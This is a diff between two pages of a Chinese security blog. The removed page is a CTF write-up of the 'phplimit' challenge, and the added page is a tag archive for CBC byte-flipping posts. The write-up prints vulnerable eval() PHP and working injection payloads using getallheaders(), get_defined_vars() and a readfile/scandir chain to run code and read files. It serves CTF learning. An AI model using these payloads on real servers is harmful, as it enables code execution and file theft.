@@ -7,26 +7,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>codebreaking-4 | 慢就是快 | glotozz&#39;blog</title>
+  <title>Tag: cbc字节翻转攻击 | 慢就是快 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="新的一天，再做几题，等下9：30开始做ichunqiu上的网络与信息安全领域专项赛，希望大佬们带我飞😘  1&amp;lt;meta name=&amp;quot;referrer&amp;quot; content=&amp;quot;no-referrer&amp;quot; /&amp;gt;">
-<meta name="keywords" content="代码审计,codebreaking">
-<meta property="og:type" content="article">
-<meta property="og:title" content="codebreaking-4">
-<meta property="og:url" content="http://yoursite.com/2019/08/15/codebreaking-4/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="慢就是快 | glotozz&#39;blog">
+<meta property="og:url" content="http://yoursite.com/tags/cbc字节翻转攻击/index.html">
 <meta property="og:site_name" content="慢就是快 | glotozz&#39;blog">
-<meta property="og:description" content="新的一天，再做几题，等下9：30开始做ichunqiu上的网络与信息安全领域专项赛，希望大佬们带我飞😘  1&amp;lt;meta name=&amp;quot;referrer&amp;quot; content=&amp;quot;no-referrer&amp;quot; /&amp;gt;">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006Xmmmggy1g602f3ikdoj314r0eydmc.jpg">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006Xmmmggy1g602n5s75uj31000arafr.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006Xmmmggy1g60305juohj30z40fl7bn.jpg">
-<meta property="og:updated_time" content="2019-08-22T13:46:44.042Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="codebreaking-4">
-<meta name="twitter:description" content="新的一天，再做几题，等下9：30开始做ichunqiu上的网络与信息安全领域专项赛，希望大佬们带我飞😘  1&amp;lt;meta name=&amp;quot;referrer&amp;quot; content=&amp;quot;no-referrer&amp;quot; /&amp;gt;">
-<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006Xmmmggy1g602f3ikdoj314r0eydmc.jpg">
+<meta name="twitter:title" content="慢就是快 | glotozz&#39;blog">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -151,233 +142,63 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-codebreaking-4" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 class="article-title" itemprop="name">
-      codebreaking-4
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/08/23/Hacker101-Encrypted-Pastebin/" class="archive-article-date">
+  	<time datetime="2019-08-23T01:23:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-23</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/08/23/Hacker101-Encrypted-Pastebin/">Hacker101 Encrypted Pastebin</a>
     </h1>
   
 
-        
-        <a href="/2019/08/15/codebreaking-4/" class="archive-article-date">
-  	<time datetime="2019-08-14T23:16:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-15</time>
-</a>
-        
-      </header>
-    
-    
-        <span class="archive-article-date">
-          阅读量 <span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>新的一天，再做几题，等下9：30开始做ichunqiu上的网络与信息安全领域专项赛，希望大佬们带我飞😘</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;</span><br></pre></td></tr></table></figure>
-
-<a id="more"></a>
-
-<h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">        eval($_GET[&apos;code&apos;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>首先搭建环境，是nginx，先用phpstudy的nginx搭建试试，不行再用linux虚拟机(￣▽￣)”</p>
-</blockquote>
-<blockquote>
-<p>原题是rctf的r-cursive，两题的意思都是只能传入函数，黁那个c</p>
-</blockquote>
-<blockquote>
-<p>(?R)是引用当前表达式的意思，即可以用\w+((?R)?)替换到(?R)的位置，因此可以衍生成匹配\w+(\w+((?R)?))、\w+(\w+(\w+((?R)?)))、…<br>(?R)? 这里多一个?表示可以有引用，也可以没有。</p>
-</blockquote>
-<p>原理是利用php的getallheaders()，我们可以通过设置ua来传入字符串，成功执行我想要的命令。这里我们先看看phpinfo的内容。</p>
-<p>payload：</p>
-<p>?code=eval(implode(array_reverse(getallheaders())));</p>
-<p>在headers的Host上面一行添加</p>
-<p>1: phpinfo();//</p>
-<p><img src="https://ws4.sinaimg.cn/large/006Xmmmggy1g602f3ikdoj314r0eydmc.jpg" alt="1565829520609"></p>
-<p>需要的注意的是getallheaders()好像是默认是逆序的，我加了var_dump()查看</p>
-<hr>
-<p>ok，本题思路类似，但是nginx</p>
-<p>我试了试上面的payload，居然也可以？？？？😢</p>
-<p><img src="https://ws1.sinaimg.cn/large/006Xmmmggy1g602n5s75uj31000arafr.jpg" alt="1565829991530"></p>
-<p>本来getallheaders()是apache模块的函数，可能是phpstudy的nginx环境问题，我没有对nginx进行配置。</p>
-<hr>
-<p>假装这是不行的，寻找nginx中能代替getallheaders()的函数</p>
-<blockquote>
-<p><strong>get_defined_vars()</strong>返回所有已定义变量所组成的数组，这个已定义的变量里就包括了<code>$_GET</code>、<code>$_POST</code>等我们可以控制的变量，所以把要执行的代码写在其他的get参数里即可</p>
-</blockquote>
-<p>构造payload：</p>
-<p>?aa=phpinfo();//&amp;code=eval(implode(reset(get_defined_vars())));</p>
-<p><img src="https://ws4.sinaimg.cn/large/006Xmmmggy1g60305juohj30z40fl7bn.jpg" alt="1565830724944"></p>
-<p>附上另一个大师傅的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
-
-<p>d=====(￣▽￣*)b</p>
-<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://lorexxar11.cn/2018/05/23/rctf2018/" target="_blank" rel="noopener">https://lorexxar11.cn/2018/05/23/rctf2018/</a></p>
-<p><a href="http://f1sh.site/2018/11/25/code-breaking-puzzles做题记录/" target="_blank" rel="noopener">http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</a></p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="https://ws1.sinaimg.cn/large/006Xmmmgly1g5wqd9c77wj309a0980u1.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">codebreaking</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">cbc字节翻转攻击</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/15/codebreaking-4/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2019/08/15/codebreaking-5/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          codebreaking-5
-        
-      </div>
-    </a>
   
   
-    <a href="/2019/08/14/codebreaking-3/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">codebreaking-3</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -401,9 +222,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
